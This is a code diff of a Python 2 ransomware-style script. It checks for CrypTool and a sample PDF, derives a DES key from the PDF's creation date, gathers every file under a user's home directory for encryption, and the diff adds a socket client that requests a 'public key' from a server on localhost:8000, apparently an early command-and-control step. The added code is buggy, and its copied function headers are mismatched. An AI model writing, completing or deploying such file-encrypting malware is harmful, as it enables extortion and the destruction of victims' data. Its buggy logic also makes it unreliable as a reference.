@@ -1,8 +1,9 @@
 # -*- coding: utf-8 -*-
-import os, fnmatch, hashlib, base64, re, hashlib, time
+import os, fnmatch, hashlib, base64, re, hashlib, time, thread, socket
 from Crypto.Cipher import DES
 from pyPdf import PdfFileReader
 from time import gmtime, strftime
+from Tkinter import *
 
 #############################################################################
 # NAME: encrypt()                                                           #
@@ -57,6 +58,12 @@ def md5(fname):
             hash.update(chunk)
     return hash.hexdigest()
 
+#############################################################################
+# NAME: generate_write_encryption()                                                              #
+# DESCRIPTION: This function finds a regex pattern in a list of files       #
+#            in a directory.                                                #
+# RETURN:                                           #
+#############################################################################
 def generate_write_encryption():
     try:
         with open(filename, 'rb+') as fd:
@@ -71,6 +78,12 @@ def generate_write_encryption():
         print "\t" + filename
     return
 
+#############################################################################
+# NAME: generate_write_encryption()                                                              #
+# DESCRIPTION: This function finds a regex pattern in a list of files       #
+#            in a directory.                                                #
+# RETURN:                                           #
+#############################################################################
 def restore_files():
     try:
         with open(filename, 'rb+') as fd:
@@ -86,7 +99,7 @@ def restore_files():
 
 checkCondition = lambda: os.path.exists("C:\\Program Files\\CrypTool\\") & os.path.isfile("C:\\Program Files\\CrypTool\\CrypTool.exe") & os.path.isfile("C:\\Users\\radiactivo\\Desktop\\sample.pdf")
 
-key = lambda: hashlib.sha256(PdfFileReader(file("C:\\Users\\radiactivo\\Desktop\\sample.pdf" , "rb")).getDocumentInfo()['/CreationDate']).digest()[:8]
+key = lambda: hashlib.sha256(PdfFileReader(file("C:\\Users\\radiactivo\\Desktop\\sample.pdf", "rb")).getDocumentInfo()['/CreationDate']).digest()[:8]
 
 if checkCondition() == False:
     exit()
@@ -95,8 +108,32 @@ key = key()
 list_of_files = find('*.*', 'C:\\Users\\radiactivo\\')
 a = 0
 print "Starting encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
-for filename in list_of_files:
+#for filename in list_of_files:
     #generate_write_encryption()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host ="localhost"
+port = 8000
+
+i = 0
+
+def ts():
+   s.send('e'.encode())
+   data = ''
+   public_key = s.recv(1024).decode()
+   print "\t Data received: ", public_key
+   return public_key
+
+print s
+while (i < 6) & (s is None):
+    s.connect((host,port))
+    i = i + 1
+    print("[*] Round: " + i +" [*]")
+
+while 2:
+   ts()
+
+s.close ()
 
 
 print "Ending encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
